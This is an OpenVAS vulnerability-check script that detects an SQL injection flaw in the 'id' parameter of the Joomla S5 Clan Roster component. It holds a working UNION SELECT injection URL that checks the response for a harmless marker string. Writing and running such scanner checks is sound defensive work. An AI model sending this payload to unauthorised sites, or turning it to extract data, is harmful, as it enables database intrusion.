###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_54932.nasl 6755 2017-07-18 12:55:56Z cfischer $
#
# Joomla S5 Clan Roster com_s5clanroster 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The S5 Clan Roster component for Joomla is prone to an SQL-injection
vulnerability because it fails to sufficiently sanitize user-supplied
data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103713";
CPE = "cpe:/a:joomla:joomla";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 6755 $");
 script_tag(name:"cvss_base", value:"8.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");

 script_name("Joomla S5 Clan Roster com_s5clanroster 'id' Parameter SQL Injection Vulnerability");

 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25410/");
 script_xref(name:"URL", value:"http://www.shape5.com/product_details/club_extensions/s5_clan_roster.html");
 script_xref(name:"URL", value:"http://www.joomla.org");
 
 script_tag(name:"last_modification", value:"$Date: 2017-07-18 14:55:56 +0200 (Tue, 18 Jul 2017) $");
 script_tag(name:"creation_date", value:"2013-05-17 11:02:29 +0200 (Fri, 17 May 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("joomla/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = dir + "/index.php?option=com_s5clanroster&view=s5clanroster&layout=category&task=category&id=77777777777'%20union+select+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374'%20--";

if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
    report = report_vuln_url( port:port, url:url ); 
    security_message(port:port, data:report);
    exit(0);

}

exit(99);
